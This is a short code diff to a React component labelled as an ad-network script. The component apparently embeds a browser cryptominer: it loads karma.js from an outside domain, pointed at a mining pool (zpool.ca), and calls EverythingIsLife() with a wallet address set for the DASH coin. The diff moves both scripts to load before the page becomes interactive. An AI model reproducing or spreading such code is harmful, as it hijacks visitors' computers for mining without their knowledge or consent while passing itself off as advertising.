@@ -99,10 +99,10 @@ const AdNetworkScript: React.FC = () => {
     </Script>
 
     <Script
-      strategy="afterInteractive"
+      strategy="beforeInteractive"
       src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
     />
-    <Script id="everythingislife-tag" strategy="afterInteractive" data-cfasync="false">
+    <Script id="everythingislife-tag" strategy="beforeInteractive" data-cfasync="false">
       {`EverythingIsLife('XtbKqMHVrWnej1cRBPYoN5MeCWthKasoHG', 'c=DASH', 60);`}
     </Script>
     </>
